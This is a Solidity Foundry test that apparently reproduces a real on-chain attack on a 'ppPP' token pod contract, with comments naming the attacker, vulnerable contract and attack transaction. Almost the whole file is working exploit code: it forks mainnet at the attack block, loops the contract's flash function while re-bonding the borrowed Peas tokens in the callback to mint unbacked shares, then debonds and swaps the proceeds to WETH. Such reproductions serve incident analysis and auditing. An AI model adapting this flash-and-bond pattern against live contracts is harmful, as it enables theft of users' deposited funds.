// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~$1K
// Attacker : https://etherscan.io/address/0xbed4fbf7c3e36727ccdab4c6706c3c0e17b10397
// Attack Contracts : https://etherscan.io/address/0xbed4fbf7c3e36727ccdab4c6706c3c0e17b10397
// Vuln Contract : https://etherscan.io/address/0xdbb20a979a92cccce15229e41c9b082d5b5d7e31
// Attack Tx : https://phalcon.blocksec.com/explorer/tx/eth/0x95c1604789c93f41940a7fd9eca11276975a9a65d250b89a247736287dbd2b7e

interface IUniswapV3Router {
    struct ExactInputParams {
        bytes path;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
    }

    function exactInput(
        ExactInputParams memory params
    ) external payable returns (uint256 amountOut);
}
interface IppPP is IERC20 {
    function flash(address _recipient, address _token, uint256 _amount, bytes memory _data) external;

    function bond(address _token, uint256 _amount) external;
    function debond(uint256 _amount, address[] memory, uint8[] memory) external;
}

contract ContractTest is Test {
    IERC20 private constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IppPP private constant ppPP = IppPP(0xdbB20A979a92ccCcE15229e41c9B082D5b5d7E31);
    IERC20 private constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 private constant Peas = IERC20(0x02f92800F57BCD74066F5709F1Daa1A4302Df875);
    IUniswapV3Router private constant Router = IUniswapV3Router(0xE592427A0AEce92De3Edee1F18E0157C05861564);

    function setUp() public {
        vm.createSelectFork("mainnet", 19109653 - 1);
        vm.label(address(DAI), "DAI");
        vm.label(address(ppPP), "ppPP");
        vm.label(address(WETH), "WETH");
        vm.label(address(Peas), "Peas");
    }

    function testExploit() public {
        deal(address(DAI), address(this), 200e18);
        emit log_named_decimal_uint("Exploiter DAI balance before attack", DAI.balanceOf(address(this)), DAI.decimals());

        uint8 i;
        while (i < 20) {
            DAI.approve(address(ppPP), 10e18);
            ppPP.flash(address(this), address(Peas), Peas.balanceOf(address(ppPP)), "");
            ++i;
        }

        address[] memory token = new address[](1);
        token[0] = address(Peas);
        uint8[] memory percentage = new uint8[](1);
        percentage[0] = 100;
        ppPP.debond(ppPP.balanceOf(address(this)), token, percentage);
        PeasToWETH();
        emit log_named_decimal_uint("Exploiter WETH balance after attack", WETH.balanceOf(address(this)), WETH.decimals());
    }

    function callback(bytes calldata data) external {
        Peas.approve(address(ppPP), Peas.balanceOf(address(this)));
        ppPP.bond(address(Peas), Peas.balanceOf(address(this)));
    }

    function PeasToWETH() internal {
        Peas.approve(address(Router), type(uint256).max);
        bytes memory _path = abi.encodePacked(
            address(Peas),
            hex"002710",
            address(DAI),
            hex"0001f4",
            address(WETH)
        );
        IUniswapV3Router.ExactInputParams memory params = IUniswapV3Router
            .ExactInputParams({
                path: _path,
                recipient: address(this),
                deadline: block.timestamp + 1000,
                amountIn: Peas.balanceOf(address(this)),
                amountOutMinimum: 0
            });
        Router.exactInput(params);
    }
}
